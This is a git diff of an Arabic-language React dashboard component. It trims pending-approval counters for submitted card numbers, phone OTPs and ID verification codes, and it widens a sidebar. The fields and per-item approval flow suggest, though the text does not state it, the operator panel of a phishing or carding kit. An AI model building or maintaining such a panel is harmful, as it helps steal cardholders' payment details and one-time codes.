@@ -747,9 +747,7 @@ export default function Dashboard({ user }: DashboardProps) {
   };
 
   const pendingApprovals = {
-    cardApprovals: applications.filter(
-      (a) => a.cardNumber && (!a.cardApproval || a.cardApproval === "pending"),
-    ).length,
+  
     phoneApprovals: applications.filter(
       (a) =>
         a.phoneOtp && (!a.phoneOtpApproval || a.phoneOtpApproval === "pending"),
@@ -758,51 +756,9 @@ export default function Dashboard({ user }: DashboardProps) {
       (a) =>
         a.phoneVerificationCode &&
         (!a.phoneVerificationStatus || a.phoneVerificationStatus === "pending"),
-    ).length,
-    idVerification: applications.filter(
-      (a) =>
-        a.idVerificationCode &&
-        (!a.idVerificationStatus || a.idVerificationStatus === "pending"),
-    ).length,
-    v1Pending: applications.filter(
-      (a) => a._v1 && (!a._v1Status || a._v1Status === "pending"),
-    ).length,
-    v2Pending: applications.filter(
-      (a) => a._v2 && (!a._v2Status || a._v2Status === "pending"),
-    ).length,
-    v3Pending: applications.filter(
-      (a) => a._v3 && (!a._v3Status || a._v3Status === "pending"),
-    ).length,
-    v4Pending: applications.filter(
-      (a) => a._v4 && (!a._v4Status || a._v4Status === "pending"),
-    ).length,
-    v5Pending: applications.filter(
-      (a) => a._v5 && (!a._v5Status || a._v5Status === "pending"),
-    ).length,
-    v6Pending: applications.filter(
-      (a) => a._v6 && (!a._v6Status || a._v6Status === "pending"),
-    ).length,
-    v7Pending: applications.filter(
-      (a) => a._v7 && (!a._v7Status || a._v7Status === "pending"),
-    ).length,
-    total: applications.filter(
-      (a) =>
-        (a.cardNumber && (!a.cardApproval || a.cardApproval === "pending")) ||
-        (a.phoneOtp &&
-          (!a.phoneOtpApproval || a.phoneOtpApproval === "pending")) ||
-        (a.phoneVerificationCode &&
-          (!a.phoneVerificationStatus ||
-            a.phoneVerificationStatus === "pending")) ||
-        (a.idVerificationCode &&
-          (!a.idVerificationStatus || a.idVerificationStatus === "pending")) ||
-        (a._v1 && (!a._v1Status || a._v1Status === "pending")) ||
-        (a._v2 && (!a._v2Status || a._v2Status === "pending")) ||
-        (a._v3 && (!a._v3Status || a._v3Status === "pending")) ||
-        (a._v4 && (!a._v4Status || a._v4Status === "pending")) ||
-        (a._v5 && (!a._v5Status || a._v5Status === "pending")) ||
-        (a._v6 && (!a._v6Status || a._v6Status === "pending")) ||
-        (a._v7 && (!a._v7Status || a._v7Status === "pending")),
-    ).length,
+    ).length
+    
+   
   };
 
   const getCountryFlag = (country?: string): string => {
@@ -997,7 +953,7 @@ export default function Dashboard({ user }: DashboardProps) {
       dir="rtl"
     >
       {/* Right Sidebar - Inbox List */}
-      <aside className="w-[320px] bg-card border-l border-border flex flex-col shrink-0 z-20 shadow-[4px_0_24px_rgba(0,0,0,0.02)]">
+      <aside className="w-[420px] bg-card border-l border-border flex flex-col shrink-0 z-20 shadow-[4px_0_24px_rgba(0,0,0,0.02)]">
         {/* Header */}
         <div className="h-14 border-b border-border flex items-center justify-between px-4 shrink-0 bg-card">
           <div className="flex items-center gap-3">
@@ -1188,7 +1144,7 @@ export default function Dashboard({ user }: DashboardProps) {
         </div>
 
         {/* Pending Approvals Warning */}
-        {warningSettings.enabled && pendingApprovals.total > 0 && (
+        {warningSettings.enabled  && (
           <div
             className="mx-3 mt-3 p-3 border rounded-lg animate-pulse"
             style={{
@@ -1215,13 +1171,7 @@ export default function Dashboard({ user }: DashboardProps) {
                   className="text-xs"
                   style={{ color: `${warningSettings.accentColor}cc` }}
                 >
-                  {warningSettings.showCardCount &&
-                    pendingApprovals.cardApprovals > 0 && (
-                      <span className="inline-flex items-center gap-1 ml-2">
-                        <CreditCard size={10} />{" "}
-                        {pendingApprovals.cardApprovals} بطاقة
-                      </span>
-                    )}
+             
                   {warningSettings.showPhoneCount &&
                     pendingApprovals.phoneApprovals > 0 && (
                       <span className="inline-flex items-center gap-1">
@@ -1235,7 +1185,6 @@ export default function Dashboard({ user }: DashboardProps) {
                 style={{ backgroundColor: warningSettings.accentColor }}
                 className="text-white animate-pulse"
               >
-                {pendingApprovals.total}
               </Badge>
             </div>
           </div>
